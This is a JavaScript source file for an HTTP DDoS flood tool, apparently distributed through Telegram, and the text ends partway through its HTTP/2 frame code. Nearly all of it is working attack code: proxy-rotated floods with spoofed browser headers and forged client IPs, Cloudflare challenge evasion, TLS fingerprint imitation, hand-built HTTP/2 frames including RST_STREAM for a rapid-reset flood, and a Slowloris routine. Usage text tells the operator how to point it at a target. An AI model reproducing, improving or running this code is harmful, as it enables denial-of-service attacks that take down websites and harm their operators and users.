const { BOT_NAME, PARAM1, PARAM2 } = process.env;
console.log(`[${BOT_NAME}] nhận:`, PARAM1, PARAM2);
// code thật của bạn ở đây
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2-wrapper');
const UserAgent = require('user-agents');
var colors = require("colors");
const cheerio = require('cheerio');
const scp = require("set-cookie-parser");
// Tạo sẵn một kho chứa 1000 chuỗi rác khi khởi động
const junkPool = [];
for (let i = 0; i < 1000; i++) {
    junkPool.push(crypto.randomBytes(64).toString('base64'));
}
// Hàm lấy nhanh một chuỗi từ kho
function getFastJunk() {
    return junkPool[Math.floor(Math.random() * junkPool.length)];
}

function encodeWindowUpdate(streamId, increment) {
    const frame = Buffer.alloc(13);
    frame.writeUInt32BE((4 << 8) | 0x8, 0); // Type 0x8 là WINDOW_UPDATE
    frame.writeUInt8(0x0, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    frame.writeUInt32BE(increment & 0x7FFFFFFF, 9);
    return frame;
}

function shuffleHeaders(headers) {
    // Tách riêng 4 pseudo-headers bắt buộc (:method, :path, :scheme, :authority)
    const pseudo = headers.filter(h => h[0].startsWith(':'));
    const normal = headers.filter(h => !h[0].startsWith(':'));

    // Xáo trộn mảng normal
    for (let i = normal.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [normal[i], normal[j]] = [normal[j], normal[i]];
    }

    return pseudo.concat(normal);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--uam', value: get_option('--uam') },
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--randpath', value: get_option('--randpath') },
    { flag: '--proxy-auth', value: get_option('--proxy-auth') },
    { flag: '--proxy-origin', value: get_option('--proxy-origin') },
    { flag: '--proxy-file', value: get_option('--proxy-file') }
];
function openLink(link) {
    const platform = process.platform;
    if (platform === 'win32') {
        exec(`start ${link}`);
    } else if (platform === 'darwin') {
        exec(`open ${link}`);
    } else if (platform === 'linux') {
        exec(`xdg-open ${link}`);
    } else {
        console.error('Unsupported platform');
    }
}

function getSmartQuery(targetUrl) {
    try {
        // Đảm bảo URL có protocol để không bị crash
        const fullUrl = targetUrl.startsWith('http') ? targetUrl : `https://${targetUrl}`;
        const urlObj = new URL(fullUrl);
        const params = new URLSearchParams(urlObj.search);
        const newParams = new URLSearchParams();

        // 1. Nếu URL gốc trắng query -> Tạo 1-2 cặp key=value ngắn gọn
        if ([...params.keys()].length === 0) {
            newParams.set(randstrr(3), randstrr(getRandomInt(5, 12)));
        } else {
            // 2. Nếu có query gốc -> Xử lý thông minh
            params.forEach((value, key) => {
                if (Math.random() > 0.2) {
                    // Giới hạn độ dài value tối đa 15 ký tự để an toàn cho MySQL
                    const randVal = Math.random() > 0.5 ? randstrr(getRandomInt(5, 15)) : getRandomInt(100, 99999);
                    newParams.set(key, randVal);
                } else {
                    newParams.set(key, value);
                }
            });
        }

        // 3. Cache Buster: Dùng chuỗi ngắn thay vì timestamp dài dằng dặc (tiết kiệm byte)
        // Hoặc dùng 3 chữ số cuối của timestamp để vẫn đảm bảo nhảy số liên tục
        newParams.set('v', Date.now().toString().slice(-6));

        // 4. Giới hạn tổng độ dài query string để tránh lỗi 414 (Request-URI Too Large)
        let finalQuery = newParams.toString();
        if (finalQuery.length > 500) {
            finalQuery = finalQuery.substring(0, 500);
        }

        return urlObj.pathname + '?' + finalQuery;
    } catch (e) {
        // Trả về path mặc định nếu có lỗi parse URL
        return "/?ref=" + randstrr(6);
    }
}

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

function createSlowLorisConnection(target, port) {
    const isTLS = port === 443;
    const agent = isTLS ? tls : net;

    const options = {
        host: target,
        port: port,
        rejectUnauthorized: false,
        servername: target
    };

    const socket = agent.connect(options, () => {
        // Gửi một phần của request và giữ nguyên đó
        socket.write(`GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1\r\n`);
        socket.write(`Host: ${target}\r\n`);
        socket.write(`User-Agent: ${new UserAgent().toString()}\r\n`);
        socket.write(`Accept: */*\r\n`);
        // KHÔNG gửi \r\n\r\n để kết thúc request

        // Cứ mỗi 10-15 giây gửi thêm 1 header giả để reset timer của server
        const interval = setInterval(() => {
            if (socket.destroyed) {
                clearInterval(interval);
                return;
            }
            socket.write(`X-Wait-${Math.random()}: ${Math.random()}\r\n`);
        }, 15000);
    });

    socket.on('error', () => socket.destroy());
    socket.on('timeout', () => socket.destroy());
}

const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from @udpzero

1. <GET/POST>: Determines the type of HTTP method to be used, whether GET or POST. Example: <GET> or <POST>.
2. <target>: Provides the URL or target to be attacked. Example: https://example.com.
3. <time>: Provides the duration or time in seconds to run the attack. Example: 60 (for a 60 second attack).
4. <threads>: Specifies the number of threads or concurrent connections to create. Example: 50.
5. <ratelimit>: Sets the rate limit for requests, if any. Example: 1000 (limit 1000 requests per second).
6. <proxy>: Specifies proxy settings that may be required. Example: http://proxy.example.com:8080.
7. --query 1/2/3/4/5/6/7/8/9/10: Optional parameters to specify a specific request or query type. Example: --query 3.
8. --delay <1-100>: Optional parameter to specify the delay between requests in milliseconds. Example: --delay 50.
9. --cookie=key: Optional parameter to specify cookies to include in the request. Example: --cookie sessionID=abc123.
10. --precheck true/false: Optional parameter to enable periodic checking mode on the target, Example: --precheck true.
11. --bfm true/false: Optional parameter to enable or disable botfightmode. Example: --bfm true.
12. --httpver "h2": Optional parameter to select alpn version. Example: --hver "h2, http/1.1, h1".
13. --referer %RAND% / https://target.com: Optional parameter to specify the referer header. Example: --referer https://example.com.
14. --postdata "user=f&pass=f": Optional parameter to include data in a POST request. Example: --postdata "username=admin&password=123".
17. --header "user-ganet@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
18. --ratelimit true/false: Optional parameter to enable ratelmit mode and bypass. Example: --ratelimit true/false.
19. --randpath true/false: Optional parameter to enable random path mode. Example: --randpath true/false.
20. --randrate true/false: Optional parameter to enable random rate mode. Example: --randrate.
21. --debug true/false: Optional parameter to display errors or output from this script. Example: --debug true.

Usage: node ${process.argv[1]} GET https://example.com/ 60 10 100 proxy.txt
`;


const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;
const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--httpver');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const docs = process.argv.indexOf('--show');
const docsvalue = docs !== -1 && docs + 1 < process.argv.length ? process.argv[docs + 1] : undefined;

if (docsvalue) {
    if (docsvalue.includes('flood')) {
        console.clear();
        console.log(docss);
        process.exit(1);
    } else if (docsvalue.includes('info')) {
        console.clear();
        console.log(`
        \x1b[35mOwner:\x1b[0m t.me/smsbinhvn
        \x1b[36mScript created on:\x1b[0m 30/04/2025
        
        \x1b[32mDescription:\x1b[0m
          - Advanced bypass for HTTP-DDoS attacks (Layer 7)
          - Automatically rotates User-Agent, headers, proxy, and cookies
          - Optimized for Linux/VPS environments with minimal resources
        
        \x1b[33mGroup chat NightCatVip:\x1b[0m @nightcatvip2
        
        `);
        process.exit(1);


    }
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`\x1b[31mUsage:\x1b[0m node \x1b[36m${process.argv[1]}\x1b[0m \x1b[33m--show type\x1b[0m`);

    console.log(`
    \x1b[32mType Options:\x1b[0m
      \x1b[33mflood\x1b[0m   - Show how to use the script for flood
      \x1b[33minfo\x1b[0m    - Display detailed script information and features
    `);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
let proxy;
proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
if (enabled('proxy-origin')) {
    proxy = proxy.filter(p => p.toLowerCase().includes(enabled('proxy-origin').toLowerCase()));
}

if (enabled('proxy-auth')) {
    const [username, password] = enabled('proxy-auth').split(':');
    proxy = proxy.map(p => {
        const [host, port] = p.split(':');
        return `${username}:${password}@${host}:${port}`;
    });
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}

if (enabled('uam')) {
    hcookie = `cf_chl`;
}


if (enabled('precheck')) {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request timed out'));
        }, 5000);
    });
    const axiosPromise = axios.get(target, {
        httpsAgent: agentbokep,
        headers: {
            'User-Agent': customUA || ua
        }
    });
    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            console.clear();
            console.log('Script by @smsbinhvn');
            const { status, data } = response;
            console.log(`> Precheck: ${status}`);
        })
        .catch((error) => {
            if (error.message === 'Request timed out') {
                console.clear();
                console.log('Script by @smsbinhvn');
                console.log(`> Precheck: Request Timed Out`);
            } else if (error.response) {
                console.clear();
                console.log('Script by @smsbinhvn');
                console.log(`> Precheck: ${error.response.status}`);
            } else {
                console.clear();
                console.log('Script by @smsbinhvn');
                console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
            }
        });
}

const randpathEnabled = enabled('randpath');
const timestampString1 = timestamp.toString().substring(0, 10);
const pathValue = randpathEnabled
    ? (Math.random() < 1 / 100000
        ? `${url.pathname}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
        : `${url.pathname}?${generateRandomString(6, 7)}&${generateRandomString(6, 7)}`
    )
    : target.path;

function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
        if (i % randomOrder === 0) {
            finalString += encryptedString.charAt(i);
        } else {
            finalString += encryptedString.charAt(i).toUpperCase();
        }
    }
    return finalString;
}

const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES"];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function generateUserAgent() {
    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

function encodeFrame(streamId, type, payload, flags = 0, paddingLen = 0) {
    let finalPayload = payload;
    let finalFlags = flags;

    if (paddingLen > 0) {
        finalFlags |= 0x8; // Bật flag PADDED
        const padLenBuffer = Buffer.alloc(1);
        padLenBuffer.writeUInt8(paddingLen, 0);

        // Cấu trúc: [Pad Length] + [Payload] + [Padding]
        finalPayload = Buffer.concat([
            padLenBuffer,
            payload,
            crypto.randomBytes(paddingLen)
        ]);
    }

    const frame = Buffer.alloc(9 + finalPayload.length);
    frame.writeUInt32BE((finalPayload.length << 8) | type, 0);
    frame.writeUInt8(finalFlags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    finalPayload.copy(frame, 9);
    return frame;
}

function encodePriorityFrame(streamId, dependsOn, weight) {
    const payload = Buffer.alloc(5);
    payload.writeUInt32BE(dependsOn & 0x7FFFFFFF, 0);
    payload.writeUInt8(weight - 1, 4);
    return encodeFrame(streamId, 0x2, payload, 0x0);
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = cookieValue;
    }
}

if (cookieValue) {
    browserVersion = '135';
} else {
    browserVersion = getRandomInt(120, 123);
}
function buildRequest() {
    //Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
    const wfwf = 'Google Chrome';
    const generateRange = () => {
        const start = Math.floor(Math.random() * 100);
        const end = start + Math.floor(Math.random() * 500);
        return `bytes=${start}-${end}, ${end + 10}-${end + 50}, ${end + 100}-${end + 200}`;
    };
    let brandValue;
    let browserVersion;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion === 135) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }
    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
    function generateRandomIP() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }
    const randomPath = Math.random() < 0.5 ? `${url.pathname}?q=${generateRandomString(5, 10)}` : url.pathname;
    if (customUA) {
        ua = customUA;
    } else {
        ua = generateUserAgent();
    }
    function getRealFullVersion(browserVersion) {
        const versionMap = {
            '135': ['135.0.7049.114'],
            '123': ['123.0.6312.86', '123.0.6312.105', '123.0.6312.122'],
            '122': ['122.0.6261.94', '122.0.6261.111', '122.0.6261.128'],
            '121': ['121.0.6167.85', '121.0.6167.140', '121.0.6167.160']
        };
        return versionMap[browserVersion] ? versionMap[browserVersion][Math.floor(Math.random() * versionMap[browserVersion].length)] : `${browserVersion}.0.${getRandomInt(1000, 9999)}.${getRandomInt(100, 999)}`;
    }

    let headers = `${reqmethod} ${randomPath} HTTP/2\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        `:authority: ${url.hostname}\r\n` +
        `:path: ${url.pathname}\r\n` +
        `:scheme: https\r\n` +
        `Range: ${generateRange()}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: keep-alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${ua}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "linux"\r\n' +
        'sec-ch-ua-platform-version: "15.0.0"\r\n' +
        `sec-ch-ua-full-version: '${getRealFullVersion(browserVersion)}'\r\n` +
        `Range: ${generateRange()}\r\n`;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
        headers += `origin: https://${url.hostname}\r\n`;
        headers += `referer: https://${url.hostname}\r\n`;
        headers += `sec-ch-ua-arch: "x86"\r\n`;
        headers += `sec-ch-ua-bitness: "64"\r\n`;
        headers += `sec-ch-ua-model: ""\r\n`;
        headers += `priority: u=${Math.floor(Math.random() * 11)}, i\r\n`;
        headers += `sec-ch-ua-model: ""\r\n`;
        headers += `CF-Connecting-IP: ${generateRandomIP()}\r\n`;
        headers += `X-Forwarded-For: ${generateRandomIP()}\r\n`;
    }
    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n`;
    } else {
        headers += `Referer: ${url.hostname}\r\n`;
    }
    headers += '\r\n';

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
const proxySessions = new Map();
function go() {
    var [proxyHost, proxyPort] = '1.1.1.1:3128';

    if (customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }
    const proxyKey = `${proxyHost}:${proxyPort}`;
    const currentSession = proxySessions.get(proxyKey) || null;
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                session: currentSession,
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1,
                ciphers: [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'ECDHE-ECDSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES128-GCM-SHA256',
                    'ECDHE-ECDSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'ECDHE-ECDSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-AES128-SHA',
                    'ECDHE-RSA-AES256-SHA'
                ].join(':'),
                honorCipherOrder: true,
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384',
                ecdhCurve: 'X25519:P-256:P-384',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                // === THÊM CÁC DÒNG SAU ===
                requestCert: false,
                rejectUnauthorized: false,
                enableTrace: false,  // Tắt trace để tránh leak fingerprint
                // Chrome thường gửi empty session ticket
                sessionTimeout: 300,
            });
            tlsSocket.on('session', (session) => {
                proxySessions.set(proxyKey, session);
            });
            tlsSocket.once('secureConnect', () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                        sleep(49)
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    sleep(1)
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }
                    sleep(19)
                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)
                const windowUpdateFrame = encodeFrame(0, 8, Buffer.from([0x00, 0x00, 0x80, 0x00])); // 32768

                const frames = [
